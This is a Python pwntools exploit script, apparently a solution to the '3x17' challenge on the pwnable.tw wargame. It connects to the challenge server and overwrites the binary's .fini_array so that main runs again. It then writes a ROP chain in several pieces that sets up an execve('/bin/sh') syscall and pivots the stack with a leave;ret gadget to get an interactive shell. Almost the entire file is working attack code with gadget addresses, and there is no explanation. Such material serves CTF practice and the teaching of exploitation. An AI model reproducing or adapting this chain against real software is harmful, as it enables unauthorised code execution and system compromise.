#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('3x17', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)

def GDB():
    if not args.REMOTE: 
        gdb.attach(p, gdbscript='''
        b*0x0000000000401bc1

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10105)
else:
    p = process([exe.path])
# .fini_array: 0x4b40f0

sa(b'addr:', f'{0x4b40f0}'.encode())
main = 0x401B6D
__libc_csu_fini = 0x402960
add_rsp  = 0x48DEE2
leave_ret = 0x401C4B  
load = flat(
    __libc_csu_fini,
    main,
)
# input()
sa(b'data:', load)

"""
0x000000000041f7dc : pop rsp ; pop r13 ; pop r14 ; pop r15 ; jmp rax
0x0000000000402fd5 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000401690 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000410b2a : pop rsp ; pop r13 ; pop r14 ; pop rbp ; ret
0x0000000000406c2c : pop rsp ; pop r13 ; pop r14 ; ret
0x000000000040ecf1 : pop rsp ; pop r13 ; ret
0x0000000000402ba9 : pop rsp ; ret
"""
pop_rdi = 0x0000000000401696
pop_rsi = 0x0000000000406c30
pop_rdx = 0x0000000000446e35
pop_rax = 0x000000000041e4af
syscall = 0x00000000004022b4
def payload(addr, data): 
    sa(b'addr:', f'{addr}'.encode())
    sa(b'data:', data)
# GDB()

buf = 0x4b4100
shell_str = 0x4b4018
load = flat(
    pop_rdi,
    shell_str,
    pop_rsi
)

payload(buf, load)

load = flat(
    0,
    pop_rdx,
    0
)
payload(buf+0x18, load)

load = flat(
    pop_rax,
    0x3b,
    syscall
)
payload(buf+0x18*2, load)
GDB()

payload(shell_str, b'/bin/sh\0')

input("input to overwrite leave ret state")
load = flat(
    leave_ret,
    main
)

payload(buf-0x10, p64(leave_ret))




p.interactive()